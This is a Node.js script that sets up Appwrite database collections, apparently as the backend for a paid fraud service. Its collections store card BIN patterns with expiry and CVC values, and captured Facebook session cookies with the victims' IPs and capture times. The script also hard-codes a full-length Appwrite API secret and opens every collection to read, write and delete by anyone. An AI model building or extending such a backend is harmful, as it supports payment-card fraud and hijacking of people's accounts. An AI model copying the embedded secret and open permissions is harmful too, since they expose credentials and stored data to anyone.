// Setup Appwrite Collections
// Run this script once to create all required collections
// Usage: node setup-collections.js

const APPWRITE_CONFIG = {
    endpoint: 'https://nyc.cloud.appwrite.io/v1',
    projectId: '693631c8001ac4fbc231',
    databaseId: '69363201001bc7a64088',
    apiSecret: 'standard_917cef86aef581038cb102a0b6d645aa4574cdccefe56659604f22954dba8b1213ac7a0172d73857e904188fba17e8574f23cfb1f4393301aae31c20b8213b086293b0f8c0f3a581e0862ef5db10ad03b749561368f61778ddf118941af5137eeae8ffc196cdb3f3b8a4ac489dd99a67a059fdfc00afad2893b8858a9ca904e3'
};

function getHeaders() {
    return {
        'Content-Type': 'application/json',
        'X-Appwrite-Project': APPWRITE_CONFIG.projectId,
        'X-Appwrite-Key': APPWRITE_CONFIG.apiSecret
    };
}

async function createCollection(collectionId, name, attributes) {
    console.log(`\nCreating collection: ${name}...`);

    try {
        // Create collection
        const createResponse = await fetch(
            `${APPWRITE_CONFIG.endpoint}/databases/${APPWRITE_CONFIG.databaseId}/collections`,
            {
                method: 'POST',
                headers: getHeaders(),
                body: JSON.stringify({
                    collectionId: collectionId,
                    name: name,
                    permissions: ['read("any")', 'create("any")', 'update("any")', 'delete("any")']
                })
            }
        );

        if (!createResponse.ok) {
            const error = await createResponse.json();
            if (error.code === 409) {
                console.log(`  Collection ${name} already exists, updating attributes...`);
            } else {
                console.error(`  Error creating collection: ${error.message}`);
                return false;
            }
        } else {
            console.log(`  Collection ${name} created successfully`);
        }

        // Create attributes
        for (const attr of attributes) {
            await createAttribute(collectionId, attr);
        }

        return true;
    } catch (error) {
        console.error(`  Error: ${error.message}`);
        return false;
    }
}

async function createAttribute(collectionId, attr) {
    const { key, type, size, required, defaultValue, array } = attr;

    let endpoint = '';
    let body = {
        key: key,
        required: required || false
    };

    switch (type) {
        case 'string':
            endpoint = 'string';
            body.size = size || 255;
            if (defaultValue !== undefined) body.default = defaultValue;
            break;
        case 'boolean':
            endpoint = 'boolean';
            if (defaultValue !== undefined) body.default = defaultValue;
            break;
        case 'integer':
            endpoint = 'integer';
            if (defaultValue !== undefined) body.default = defaultValue;
            break;
        case 'datetime':
            endpoint = 'datetime';
            break;
        default:
            endpoint = 'string';
            body.size = size || 255;
    }

    try {
        const response = await fetch(
            `${APPWRITE_CONFIG.endpoint}/databases/${APPWRITE_CONFIG.databaseId}/collections/${collectionId}/attributes/${endpoint}`,
            {
                method: 'POST',
                headers: getHeaders(),
                body: JSON.stringify(body)
            }
        );

        if (response.ok) {
            console.log(`    ✓ Attribute '${key}' created`);
        } else {
            const error = await response.json();
            if (error.code === 409) {
                console.log(`    - Attribute '${key}' already exists`);
            } else {
                console.log(`    ✗ Error creating '${key}': ${error.message}`);
            }
        }
    } catch (error) {
        console.log(`    ✗ Error creating '${key}': ${error.message}`);
    }

    // Small delay to avoid rate limiting
    await new Promise(resolve => setTimeout(resolve, 500));
}

async function setup() {
    console.log('========================================');
    console.log('Appwrite Collections Setup');
    console.log('========================================');
    console.log(`Endpoint: ${APPWRITE_CONFIG.endpoint}`);
    console.log(`Project: ${APPWRITE_CONFIG.projectId}`);
    console.log(`Database: ${APPWRITE_CONFIG.databaseId}`);

    // Users Collection
    await createCollection('users', 'Users', [
        { key: 'userId', type: 'string', size: 100, required: true },
        { key: 'username', type: 'string', size: 100, required: true },
        { key: 'email', type: 'string', size: 255, required: false },
        { key: 'password', type: 'string', size: 255, required: false },
        { key: 'deviceName', type: 'string', size: 100, required: false },
        { key: 'machineId', type: 'string', size: 100, required: false },
        { key: 'createdAt', type: 'string', size: 50, required: false },
        { key: 'lastLogin', type: 'string', size: 50, required: false }
    ]);

    // Subscriptions Collection
    await createCollection('subscriptions', 'Subscriptions', [
        { key: 'userId', type: 'string', size: 100, required: true },
        { key: 'isActive', type: 'boolean', required: true, defaultValue: true },
        { key: 'expiryDate', type: 'string', size: 50, required: true },
        { key: 'plan', type: 'string', size: 50, required: false, defaultValue: 'monthly' },
        { key: 'createdAt', type: 'string', size: 50, required: false }
    ]);

    // BINs Collection
    await createCollection('bins', 'BINs', [
        { key: 'userId', type: 'string', size: 100, required: true },
        { key: 'pattern', type: 'string', size: 20, required: true },
        { key: 'name', type: 'string', size: 100, required: false },
        { key: 'expiry', type: 'string', size: 10, required: false },
        { key: 'cvc', type: 'string', size: 5, required: false },
        { key: 'createdAt', type: 'string', size: 50, required: false }
    ]);

    // Cookies Collection
    await createCollection('cookies', 'Facebook Cookies', [
        { key: 'userId', type: 'string', size: 100, required: true },
        { key: 'cookies', type: 'string', size: 10000, required: true },
        { key: 'url', type: 'string', size: 500, required: false },
        { key: 'ip', type: 'string', size: 50, required: false },
        { key: 'capturedAt', type: 'string', size: 50, required: false }
    ]);

    // Logs Collection
    await createCollection('logs', 'Activity Logs', [
        { key: 'userId', type: 'string', size: 100, required: false },
        { key: 'type', type: 'string', size: 50, required: true },
        { key: 'data', type: 'string', size: 5000, required: false },
        { key: 'ip', type: 'string', size: 50, required: false },
        { key: 'createdAt', type: 'string', size: 50, required: false }
    ]);

    console.log('\n========================================');
    console.log('Setup Complete!');
    console.log('========================================');
    console.log('\nNote: Attributes may take a few seconds to become available.');
    console.log('You can verify in the Appwrite Console.');
}

// Run setup
setup().catch(console.error);
